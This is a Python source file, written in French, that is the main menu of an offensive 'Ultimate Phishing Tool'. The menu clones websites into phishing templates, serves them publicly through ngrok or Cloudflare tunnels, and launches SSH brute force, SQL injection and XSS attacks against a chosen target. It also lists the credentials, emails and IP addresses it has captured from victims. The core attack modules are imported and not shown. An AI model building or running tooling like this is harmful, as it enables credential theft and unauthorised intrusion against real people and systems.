#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
🎣 ULTIMATE PHISHING TOOL v4.0
Module principal - Gray Hat Pentest
"""

import os
import sys
import time
from datetime import datetime

# Import des modules
try:
    from core.phishing_core import PhishingCore
    from core.advanced_attacks import AdvancedAttacks
    from core.site_cloner import SiteCloner
    from core.tunnel_manager import TunnelManager
except ImportError:
    print("❌ Modules manquants. Installation...")
    os.system("pip install flask requests user-agents geocoder beautifulsoup4 paramiko python-nmap")
    sys.exit(1)

class UltimatePhishingTool:
    def __init__(self):
        print("🎣 ULTIMATE PHISHING TOOL v4.0")
        print("Gray Hat - Multi-Attack - Site Cloning")
        
        # Modules
        self.phishing = PhishingCore()
        self.attacks = AdvancedAttacks()
        self.cloner = SiteCloner()
        self.tunnels = TunnelManager()
        
        self.host = "0.0.0.0"
        self.port = 8080
        
        self.main_menu()
        
    def main_menu(self):
        while True:
            print("\n" + "="*50)
            print("1. 🎯 Phishing Classique")
            print("2. 🌐 Cloner Site")
            print("3. ⚡ Attaques Avancées")
            print("4. 🚇 Tunnels")
            print("5. 📊 Stats")
            print("0. 🚪 Quitter")
            print("="*50)
            
            choice = input("Choix: ")
            
            if choice == "1":
                self.phishing_menu()
            elif choice == "2":
                self.clone_menu()
            elif choice == "3":
                self.attacks_menu()
            elif choice == "4":
                self.tunnel_menu()
            elif choice == "5":
                self.show_stats()
            elif choice == "0":
                self.cleanup()
                break
                
    def phishing_menu(self):
        print("\n🎯 PHISHING CLASSIQUE")
        templates = self.get_templates()
        
        if not templates:
            print("❌ Aucun template!")
            return
            
        for i, template in enumerate(templates, 1):
            print(f"{i}. {os.path.basename(template)}")
            
        try:
            choice = int(input("Template: ")) - 1
            if 0 <= choice < len(templates):
                self.phishing.set_template(templates[choice])
                self.phishing.start_server(self.host, self.port)
                print(f"🚀 Serveur: http://{self.host}:{self.port}")
                input("⏹️ Ctrl+C pour arrêter...")
                self.phishing.stop_server()
        except (ValueError, KeyboardInterrupt):
            pass
            
    def clone_menu(self):
        print("\n🌐 CLONAGE DE SITES")
        url = input("URL à cloner: ")
        if url:
            template = self.cloner.clone_site(url)
            if template:
                print(f"✅ Cloné: {template}")
                self.phishing.set_template(template)
                
    def attacks_menu(self):
        print("\n⚡ ATTAQUES AVANCÉES")
        print("1. Scan réseau")
        print("2. SSH Brute Force")
        print("3. Web Enumeration")
        print("4. SQL Injection")
        print("5. XSS Test")
        
        choice = input("Attaque: ")
        target = input("Cible: ")
        
        if choice == "1" and target:
            self.attacks.network_scan(target)
        elif choice == "2" and target:
            user = input("Utilisateur: ")
            wordlist = input("Wordlist: ")
            if user and wordlist:
                self.attacks.ssh_brute_force(target, user, wordlist)
        elif choice == "3" and target:
            self.attacks.web_enumeration(target)
        elif choice == "4" and target:
            self.attacks.sql_injection_test(target)
        elif choice == "5" and target:
            self.attacks.xss_test(target)
            
    def tunnel_menu(self):
        print("\n🚇 TUNNELS")
        print("1. Ngrok")
        print("2. Cloudflare")
        print("3. LocalTunnel")
        print("4. Proxy")
        
        choice = input("Tunnel: ")
        
        if choice == "1":
            self.tunnels.start_ngrok(self.port)
        elif choice == "2":
            self.tunnels.start_cloudflare_tunnel(self.port)
        elif choice == "3":
            self.tunnels.start_localtunnel(self.port)
        elif choice == "4":
            self.tunnels.start_proxy_server(self.port)
            
    def show_stats(self):
        print("\n📊 STATISTIQUES")
        stats = self.phishing.get_stats()
        print(f"🎯 Victimes: {stats['total_victims']}")
        print(f"✅ Succès: {stats['successful_attacks']}")
        print(f"📝 Credentials: {stats['captured_credentials']}")
        
        creds = self.phishing.get_credentials()
        if creds:
            print(f"\n📋 Derniers ({len(creds)}):")
            for cred in creds[-3:]:
                print(f"  • {cred.get('email', 'N/A')} | {cred.get('ip_address', 'N/A')}")
                
    def get_templates(self):
        templates = []
        if os.path.exists("templates"):
            for file in os.listdir("templates"):
                if file.endswith('.html'):
                    templates.append(os.path.join("templates", file))
        return templates
        
    def cleanup(self):
        print("🧹 Nettoyage...")
        self.phishing.stop_server()
        self.tunnels.stop_all_tunnels()
        print("✅ Terminé")

def main():
    # Créer dossiers
    for dir in ['templates', 'cloned_sites', 'exports', 'logs']:
        os.makedirs(dir, exist_ok=True)
        
    # Lancer
    try:
        UltimatePhishingTool()
    except KeyboardInterrupt:
        print("\n👋 Au revoir!")

if __name__ == "__main__":
    main()